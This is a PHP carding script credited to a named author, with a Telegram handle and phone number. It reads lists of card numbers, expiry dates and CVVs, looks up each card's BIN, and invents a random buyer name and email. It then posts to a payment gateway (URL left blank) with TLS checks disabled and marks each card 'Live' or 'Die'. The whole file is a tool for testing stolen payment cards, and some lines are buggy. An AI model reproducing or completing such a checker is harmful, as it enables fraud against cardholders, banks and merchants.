<?php

/*
*Author: Pugno <pugno_fc>
*/

/*
 _ __ _  _ __ _ _ _  ___ 
| '_ \ || / _` | ' \/ _ \
| .__/\_,_\__, |_||_\___/
|_|       |___/          


Corre no meu canal do youtube 

* @𝓐𝓾𝓽𝓱𝓸𝓻   𝓟 𝓾 𝓰 𝓷 𝓸
*
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓦𝓱𝓪𝓽𝓼𝓪𝓹𝓹  >>  (21) 97225-9563
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓣𝓮𝓵𝓮𝓰𝓻𝓪𝓶  >>  @pugno_fc
*
*/
error_reporting(0);
if (file_exists("cookie.txt") !== false) {
    unlink("cookie.txt");
    fopen("cookie<.txt", 'w+');
    fclose("cookie.txt");
} else {
    fopen("cookie.txt", 'w+');
    fclose("cookie.txt");
}
function getStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode($lista)[0];
$mes = multiexplode($lista)[1];
$ano = multiexplode($lista)[2];
$cvv = multiexplode($lista)[3];

$t = strlen($ano);
if ($t > 2){
  $ano = substr($ano, 2,4);
}
$data = $mes."/20".$ano;
$bindata = file_get_contents("https://dragon-bin-api.vercel.app/api/$cc");
$bin = getStr($bindata,'"bin":"','"');    
$card_brand = getStr($bindata,'"vendor":"','"');
$card_type = getStr($bindata,'"type":"','"');
$card_category = getStr($bindata,'"level":"','"');
$country_code = getStr($bindata,'","code":"','"');
$country = getStr($bindata,'","country":"','"');
$Bank = getStr($bindata,'"bank":"','"');
$emoji = getStr($bindata,'","emoji":"','"');
$cardinfo = "$bin | $Bank - $card_brand - $card_type - $country $emoji";


$nm = ["marcos","abreu","murilo","diego","aberto","dario","micael","rodrigo","marlon","silva","Abrahao","Abade","francisco","alan","ronaldo","marinho","Abelardo","magal","lemos","thales","tiago","Diniz","luiz","heitor","leandro","arthur","david","juan","diogo","caue","joaquin","isaac","carlos","andre","marrone","ian"]; ####36####
$nomeemail = $nm[array_rand($nm)];

$sobre = ["rodrigues","vieira","castro","oliveira","gomes","almeida","andrade","barros","borges","campos","cardoso","carvalho","costa","dias","dantas","duarte","santos","freitas","fernandes","ferreira","garcia","gonçalves","lima","lopes","machado","marques","bernardo","martins","medeiros","melo","mendes","miranda","monteiro","moraes","neves","moreira"]; ####36####
$sobrenome = $sobre[array_rand($sobre)];
$nomecompleto = strtoupper($nomeemail." ".$sobrenome);
$email = $nomeemail.$sobrenome.rand(000,999)."x@gmail.com";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

$result = curl_exec($ch);

$retorno = getStr($result, '":','"');
if (strpos($result, 'Autorizacao negada')){
  $status = "<span class='badge badge-danger'>Die</span>";
  $vbv = "<span style='color:red;'>$retorno</span>";
}elseif(strpos($result, 'Não foi possível realizar seu pagamento.')) {  
  $status = "<span class='badge badge-danger'>#Aprovada</span>";
  $vbv = "<span style='color:red;'>$retorno</span>";
}
else {  
  $status = "<span class='badge badge-success'>Live</span>";
  $vbv = "<span style='color:green;'>$retorno</span>";
}

echo("<br>$status  <span style='color:White;'>$lista</span> 『 $cardinfo 』 Retorno: ($vbv) <span class='badge badge-light'>[Pugno Coder]</span><br>");

?>